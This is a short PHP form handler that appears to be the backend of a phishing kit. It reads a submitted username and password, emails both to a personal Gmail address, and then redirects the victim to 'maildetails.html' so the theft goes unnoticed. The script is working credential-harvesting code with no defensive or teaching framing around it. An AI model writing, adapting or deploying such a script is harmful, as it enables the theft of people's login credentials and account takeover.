<?php
  $username = $_POST['username'];
  $password = $_POST['password'];

  
	$email_from = 'workload';

	$email_subject = "New Form submission";

                            $to = "omotosolilhenxy@gmail.com";

                            $headers = "From: $email_from \r\n";
                          
                            $headers .=  "Username: $username \r\n Password: $password \r\n ";
                        
                          
                            mail($to,$email_subject,$headers);
                            header("location: maildetails.html");


?>